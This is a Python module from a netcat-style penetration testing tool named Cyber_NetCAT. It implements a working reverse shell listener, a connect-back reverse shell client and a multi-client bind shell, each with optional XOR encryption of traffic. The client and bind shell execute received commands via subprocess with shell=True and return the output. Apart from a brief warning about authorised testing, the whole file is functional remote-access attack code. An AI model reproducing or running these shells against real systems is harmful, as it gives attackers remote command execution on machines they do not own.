"""
Cyber_NetCAT — Reverse/Bind Shell Module

Provides reverse shell listener, reverse shell client (connect-back),
and bind shell server with optional XOR encryption.
"""

import socket
import subprocess
import threading
import sys
import os
import platform

from netcat_tool.utils.colors import (
    print_sub_header, print_info, print_success, print_error,
    print_warning, print_result, success, error, warning,
    info, dim, bold
)
from netcat_tool.utils.banner import print_module_banner


def _xor_encrypt(data, key):
    """
    XOR encrypt/decrypt data with a key.

    Args:
        data: Bytes to encrypt/decrypt.
        key: Encryption key string.

    Returns:
        XOR-encrypted bytes.
    """
    key_bytes = key.encode() if isinstance(key, str) else key
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])


def _reverse_shell_listener(port, encrypt=False, key='NetCAT'):
    """
    Start a reverse shell listener that waits for incoming connections.
    Once connected, provides an interactive command shell.

    Args:
        port: Port to listen on.
        encrypt: Whether to use XOR encryption.
        key: Encryption key.
    """
    print_sub_header("Reverse Shell Listener")
    print_info(f"Listening on 0.0.0.0:{port}")
    if encrypt:
        print_info(f"Encryption: XOR (key: {'*' * len(key)})")
    print_info("Waiting for incoming connection...")
    print()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(('0.0.0.0', port))
        server.listen(1)

        client_socket, client_addr = server.accept()
        print_success(f"Connection received from {client_addr[0]}:{client_addr[1]}")
        print_info("Type 'exit' or 'quit' to close the session")
        print(f"  {dim('─' * 50)}")
        print()

        # Interactive session
        while True:
            try:
                # Get command from user
                command = input(f"{success('shell')}@{info(client_addr[0])}> ")

                if command.lower() in ('exit', 'quit'):
                    print_info("Closing session...")
                    if encrypt:
                        client_socket.send(_xor_encrypt(b'exit', key))
                    else:
                        client_socket.send(b'exit')
                    break

                if not command.strip():
                    continue

                # Send command
                if encrypt:
                    client_socket.send(_xor_encrypt(command.encode(), key))
                else:
                    client_socket.send(command.encode())

                # Receive output
                response = b''
                client_socket.settimeout(5)
                try:
                    while True:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                        if len(chunk) < 4096:
                            break
                except socket.timeout:
                    pass

                if response:
                    if encrypt:
                        response = _xor_encrypt(response, key)
                    print(response.decode('utf-8', errors='replace'), end='')

            except (EOFError, KeyboardInterrupt):
                print()
                print_info("Session terminated.")
                break
            except (ConnectionResetError, BrokenPipeError):
                print_error("Connection lost.")
                break

        client_socket.close()

    except OSError as e:
        print_error(f"Listener error: {e}")
    finally:
        server.close()


def _reverse_shell_client(target, port, encrypt=False, key='NetCAT'):
    """
    Connect back to a listener and provide shell access.

    Args:
        target: Listener IP address.
        port: Listener port.
        encrypt: Whether to use XOR encryption.
        key: Encryption key.
    """
    print_sub_header("Reverse Shell Client")
    print_info(f"Connecting to {target}:{port}")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        print_success(f"Connected to {target}:{port}")

        while True:
            try:
                # Receive command
                sock.settimeout(None)
                data = sock.recv(4096)

                if not data:
                    break

                if encrypt:
                    data = _xor_encrypt(data, key)

                command = data.decode('utf-8', errors='replace').strip()

                if command.lower() in ('exit', 'quit'):
                    break

                # Execute command
                try:
                    if platform.system().lower() == 'windows':
                        result = subprocess.run(
                            command, shell=True, capture_output=True,
                            text=True, timeout=30
                        )
                    else:
                        result = subprocess.run(
                            command, shell=True, capture_output=True,
                            text=True, timeout=30
                        )

                    output = result.stdout + result.stderr
                    if not output:
                        output = "[No output]\n"

                except subprocess.TimeoutExpired:
                    output = "[Command timed out]\n"
                except Exception as e:
                    output = f"[Error: {e}]\n"

                # Send output
                output_bytes = output.encode('utf-8')
                if encrypt:
                    output_bytes = _xor_encrypt(output_bytes, key)

                sock.send(output_bytes)

            except (ConnectionResetError, BrokenPipeError):
                break

        sock.close()

    except ConnectionRefusedError:
        print_error(f"Connection refused by {target}:{port}")
    except socket.timeout:
        print_error(f"Connection timed out to {target}:{port}")
    except OSError as e:
        print_error(f"Connection error: {e}")


def _bind_shell(port, encrypt=False, key='NetCAT'):
    """
    Bind a shell to a port, allowing incoming connections to execute commands.

    Args:
        port: Port to bind on.
        encrypt: Whether to use XOR encryption.
        key: Encryption key.
    """
    print_sub_header("Bind Shell")
    print_info(f"Binding shell on 0.0.0.0:{port}")
    if encrypt:
        print_info(f"Encryption: XOR enabled")
    print_info("Waiting for connection...")
    print()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(('0.0.0.0', port))
        server.listen(1)

        while True:
            client_socket, client_addr = server.accept()
            print_success(f"Client connected: {client_addr[0]}:{client_addr[1]}")

            # Handle client in a thread
            thread = threading.Thread(
                target=_handle_bind_client,
                args=(client_socket, client_addr, encrypt, key),
                daemon=True
            )
            thread.start()

    except OSError as e:
        print_error(f"Bind shell error: {e}")
    except KeyboardInterrupt:
        print_info("Bind shell shutting down...")
    finally:
        server.close()


def _handle_bind_client(client_socket, client_addr, encrypt, key):
    """Handle a single bind shell client connection."""
    try:
        # Send prompt
        prompt = f"shell@{socket.gethostname()}> "
        prompt_bytes = prompt.encode()
        if encrypt:
            prompt_bytes = _xor_encrypt(prompt_bytes, key)
        client_socket.send(prompt_bytes)

        while True:
            data = client_socket.recv(4096)
            if not data:
                break

            if encrypt:
                data = _xor_encrypt(data, key)

            command = data.decode('utf-8', errors='replace').strip()

            if command.lower() in ('exit', 'quit'):
                break

            if not command:
                continue

            # Execute command
            try:
                result = subprocess.run(
                    command, shell=True, capture_output=True,
                    text=True, timeout=30
                )
                output = result.stdout + result.stderr
                if not output:
                    output = "[No output]\n"
            except subprocess.TimeoutExpired:
                output = "[Command timed out]\n"
            except Exception as e:
                output = f"[Error: {e}]\n"

            # Add prompt to output
            output += prompt

            output_bytes = output.encode('utf-8')
            if encrypt:
                output_bytes = _xor_encrypt(output_bytes, key)

            client_socket.send(output_bytes)

    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        print_warning(f"Client disconnected: {client_addr[0]}:{client_addr[1]}")
        client_socket.close()


def run_shell(args):
    """
    Execute shell operations.

    Args:
        args: Parsed CLI arguments.

    Returns:
        Dictionary with shell operation results.
    """
    print_module_banner("Shell Operations", "Reverse/Bind shell with optional encryption")

    port = args.port
    encrypt = args.encrypt
    key = args.key

    print_warning("⚠ Shell operations are for AUTHORIZED testing only!")
    print()

    results = {'action': None, 'port': port, 'encrypted': encrypt}

    if args.listen:
        results['action'] = 'reverse_listener'
        _reverse_shell_listener(port, encrypt, key)

    elif args.connect:
        results['action'] = 'reverse_client'
        _reverse_shell_client(args.connect, port, encrypt, key)

    elif args.bind:
        results['action'] = 'bind_shell'
        _bind_shell(port, encrypt, key)

    return {'shell': results}
